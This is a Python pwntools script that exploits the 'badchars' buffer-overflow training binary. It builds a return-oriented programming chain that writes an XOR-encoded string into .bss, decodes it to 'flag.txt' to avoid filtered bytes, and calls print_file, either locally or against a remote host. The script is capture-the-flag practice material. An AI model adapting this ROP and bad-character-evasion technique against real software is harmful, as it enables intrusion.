#!/usr/bin/python3

from pwn import *

local = True
filename = './badchars'
hostname = 'hostname'
port = 1234

e = ELF(filename)

# Function
print_func = e.symbols.print_file
print(f'Address of print_file: {hex(print_func)}')

# Gadgets
#mov = 0x400628 # mov qword ptr [r14], r15; ret;
#r14_15 = 0x400690 # pop r14; pop r15; ret;
mov = 0x400634 # mov qword ptr [r13], r12; ret;
ret = 0x4004ee # ret;
rdi = 0x4006a3 # pop rdi; ret;
r12_15 = 0x40069c # pop r12; pop r13; pop r14; pop r15; ret;
xor = 0x400628 # xor byte ptr [r15], r14b; ret;

# Read-Write Section
# Tested with .data and .got, but those did not work!!
rw_section = 0x601038 # -rw- .bss

if local:
    p = process(filename)
else:
    p = remote(hostname, port)

badchars = ['x', 'g', 'a', '.']

# Add offset to get to the buffer overflow
payload = 40 * b'A'
# Put rw_section .bss into r13, and 'dnce,vzv' into r12
payload += p64(r12_15)
payload += b'dnce,vzv'
payload += p64(rw_section)
payload += p64(0)
payload += p64(0)
# Move dnce,vzv (r12) into .bss (r13)
payload += p64(mov)
# XOR string dnce,vzv we just put in bss section, so it will say flag.txt
# to do this, XOR it with value 2 character by character
# XOR needs r15 (bss) and r14 (xor value), so fill those first
for index in range(len('flag.txt')):
    payload += p64(r12_15)
    payload += p64(0)
    payload += p64(0)
    payload += p64(2)
    payload += p64(rw_section + index)
    payload += p64(xor)
# Put rw_section .bss into rdi, rw_section now has 'flag.txt'
payload += p64(rdi)
payload += p64(rw_section)
# Call print_func, it takes one argument, which we already put in rdi
payload += p64(print_func)

print(f'Payload is {payload}')

for badchar in badchars:
    if badchar.encode() in payload:
        print(f'Ups, {badchar} is in payload')  

p.sendafter(b'> ', payload)
result = p.recvall(timeout=2)
print(result)
